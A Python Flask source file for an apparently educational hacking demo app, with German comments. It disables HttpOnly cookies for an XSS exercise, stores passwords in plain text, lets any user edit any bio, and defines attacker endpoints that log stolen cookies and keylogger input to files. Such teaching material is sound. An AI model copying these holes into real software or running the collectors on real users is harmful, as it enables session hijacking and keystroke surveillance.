from flask import Flask, render_template, request, redirect, session, url_for, flash
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

import mysql.connector
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)  # for sessions

# XSS DEMO: HttpOnly Cookie deaktivieren (damit document.cookie funktioniert)
app.config['SESSION_COOKIE_HTTPONLY'] = False
app.config['SESSION_COOKIE_SAMESITE'] = None

# BRUTE-FORCE SCHUTZ: Rate Limiting (auskommentiert für Tests)
# limiter = Limiter(
#     get_remote_address,
#     app=app,
#     default_limits=["200 per day", "50 per hour"],
#     storage_uri="memory://"
# )

# --- CONFIG:
DB_CONFIG = {
    "host": "127.0.0.1",
    "user": "root",
    #"password": "mysql",   
    "database": "hackingdb",
    "port": 3306
}
# ------------------------------------------------

def get_db():
    return mysql.connector.connect(**DB_CONFIG)

@app.route("/")
def index():
    user = session.get("user")
    return render_template("index.html", user=user)

# --- REGISTER ---
@app.route("/register", methods=["GET","POST"])
# @limiter.limit("3 per minute")  # Max 3 Registrierungen pro Minute
def register():
    if request.method == "POST":
        username = request.form.get("username", "")[:150]
        password = request.form.get("password", "")  # intentionally plain
        bio = request.form.get("bio", "")[:512]      # 512 char input
        conn = get_db()
        cur = conn.cursor()
        try:
            # SICHER: Prepared Statement statt String-Concatenation
            cur.execute("INSERT INTO users (username, password, bio) VALUES (%s, %s, %s)",
                       (username, password, bio))
            conn.commit()
            flash("Registered. You can now log in.", "success")
            return redirect(url_for("login"))
        except Exception as e:
            conn.rollback()
            flash("Error registering: " + str(e), "danger")
        finally:
            cur.close()
            conn.close()
    return render_template("register.html")

# --- LOGIN ---
@app.route("/login", methods=["GET","POST"])
#@limiter.limit("5 per minute")  
def login():
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        conn = get_db()
        cur = conn.cursor(dictionary=True)
        # SICHER: Prepared Statement verhindert SQL Injection
        cur.execute("SELECT * FROM users WHERE username = %s AND password = %s LIMIT 1",
                   (username, password))
        row = cur.fetchone()
        cur.close()
        conn.close()
        if row:
            session["user"] = {"id": row["id"], "username": row["username"]}
            flash("Logged in.", "success")
            return redirect(url_for("index"))
        else:
            flash("Ungültige Eingabedaten", "danger")
    return render_template("login.html")

# --- LOGOUT ---
@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))

# USERS: shows ALL info about all users
@app.route("/users")
def users():
    if not session.get("user"):
        return redirect(url_for("login"))
    conn = get_db()
    cur = conn.cursor(dictionary=True)
    cur.execute("SELECT * FROM users")
    rows = cur.fetchall()
    cur.close()
    conn.close()
    return render_template("users.html", users=rows, me=session.get("user"))

@app.route("/posts", methods=["GET", "POST"])
def posts():
    if not session.get("user"):
        return redirect(url_for("login"))

    if request.method == "POST":
        content = request.form.get("content", "")[:512]
        user_id = session["user"]["id"]
        conn = get_db()
        cur = conn.cursor()
        try:
            # SICHER: Prepared Statement
            cur.execute("INSERT INTO posts (user_id, content) VALUES (%s, %s)",
                       (user_id, content))
            conn.commit()
            flash("Post gespeichert.", "success")
        except Exception as e:
            conn.rollback()
            flash("Fehler beim Speichern: " + str(e), "danger")
        finally:
            cur.close()
            conn.close()
        return redirect(url_for("posts"))

    # GET: alle Posts anzeigen
    conn = get_db()
    cur = conn.cursor(dictionary=True)
    cur.execute("SELECT p.id, p.user_id, p.content, p.created_at FROM posts p ORDER BY p.created_at DESC")
    rows = cur.fetchall()

    for r in rows:
        # SICHER: Prepared Statement
        cur.execute("SELECT username FROM users WHERE id = %s LIMIT 1", (r['user_id'],))
        u = cur.fetchone()
        r["username"] = u["username"] if u else "unknown"

    cur.close()
    conn.close()
    return render_template("posts.html", posts=rows)

@app.route("/edit_bio/<int:uid>", methods=["GET", "POST"])
def edit_bio(uid):
    if not session.get("user"):
        return redirect(url_for("login"))

    conn = get_db()
    cur = conn.cursor(dictionary=True)

    if request.method == "POST":
        bio = request.form.get("bio", "")[:512]

        try:
            # SICHER: Prepared Statement verhindert SQL Injection
            cur.execute("UPDATE users SET bio = %s WHERE id = %s", (bio, uid))
            conn.commit()
            flash("Bio aktualisiert.", "success")
        except Exception as e:
            conn.rollback()
            flash("Fehler beim Aktualisieren: " + str(e), "danger")
        finally:
            cur.close()
            conn.close()
        return redirect(url_for("users"))

    # GET: User-Daten laden
    try:
        # SICHER: Prepared Statement
        cur.execute("SELECT * FROM users WHERE id = %s LIMIT 1", (uid,))
        row = cur.fetchone()
    finally:
        cur.close()
        conn.close()

    if not row:
        flash("User nicht gefunden.", "danger")
        return redirect(url_for("users"))

    return render_template("edit_bio.html", u=row)

@app.route("/search", methods=["GET", "POST"])
def search():
    if not session.get("user"):
        return redirect(url_for("login"))
    
    results = []
    search_term = ""
    
    if request.method == "POST":
        search_term = request.form.get("search", "")
        
        conn = get_db()
        cur = conn.cursor(dictionary=True)
        
        try:
            # SICHER: Prepared Statement mit LIKE-Pattern
            # Query gibt 3 Spalten zurück: id, username, bio
            search_pattern = f"%{search_term}%"
            cur.execute("SELECT id, username, bio FROM users WHERE username LIKE %s", (search_pattern,))
            results = cur.fetchall()
        except Exception as e:
            flash(f"Fehler: {e}", "danger")
        finally:
            cur.close()
            conn.close()
    
    return render_template("search.html", results=results, search_term=search_term)

# --- XSS DEMO ENDPOINTS (Bildungszwecke) ---
@app.route("/steal_cookie", methods=["GET", "POST"])
def steal_cookie():
    """Endpoint zum Empfangen gestohlener Cookies"""
    cookie = request.args.get("c") or request.form.get("c", "")
    victim_ip = get_remote_address()

    print("\n" + "="*60)
    print("COOKIE STOLEN")
    print("="*60)
    print(f"Victim IP: {victim_ip}")
    print(f"Cookie: {cookie}")
    print("="*60 + "\n")

    with open("stolen_cookies.txt", "a") as f:
        f.write(f"[{victim_ip}] {cookie}\n")

    return "", 200

@app.route("/log_keys", methods=["POST"])
def log_keys():
    """Endpoint zum Empfangen von Keylogger-Daten"""
    keys = request.form.get("keys", "")
    victim_ip = get_remote_address()

    if keys:
        print(f"\nKEYLOG [{victim_ip}]: {keys}")

        with open("keylog.txt", "a") as f:
            f.write(f"[{victim_ip}] {keys}\n")

    return "", 200

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=5001, threaded=True)
